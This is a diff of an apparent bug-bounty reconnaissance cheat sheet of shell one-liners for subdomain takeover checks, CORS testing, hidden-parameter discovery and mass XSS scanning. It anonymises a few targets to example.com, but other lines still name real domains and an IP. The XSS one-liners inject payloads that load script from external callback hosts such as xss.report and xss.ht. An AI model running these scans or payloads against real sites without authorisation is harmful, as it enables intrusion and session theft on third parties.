@@ -20,7 +20,7 @@ cat live-urls.txt | grep "=" > live-parameters.txt
 
 cat alljs.txt | nuclei -t /nuclei-templates/http/exposures/ 
 
-echo www.viator.com | katana -ps | grep -E "\.js$" | nuclei -t /nuclei-templates/http/exposures/ -c 30
+echo www.example.com | katana -ps | grep -E "\.js$" | nuclei -t /nuclei-templates/http/exposures/ -c 30
 
 nuclei -t /nuclei-templates/takeovers/ -l live-subs.txt
 
@@ -42,14 +42,14 @@ subfinder -d viator.com | httpx-toolkit -silent |  katana -ps -f qurl | gf xss |
 subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl
 
 python3 /opt/Corsy/corsy.py -i subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
-
+~Cors Poc Exploit : https://github.com/hunthack3r/PoCors.git ~
 
 ## Looking for Hidden parameters :-
 
 
 arjun -u https://44.75.33.22wms/wms.login -w burp-parameter-names.txt
 
-waybackurls youneedabudget.com | gf xss | grep '=' | qsreplace '"><script src=https://xss.report/c/binbash></script>' | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n";done
+waybackurls example.com | gf xss | grep '=' | qsreplace '"><script src=https://xss.report/c/binbash></script>' | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n";done
 
 dalfox url https://access.epam.com/auth/realms/plusx/protocol/openid-connect/auth?response_type=code -b https://hahwul.xss.ht
 
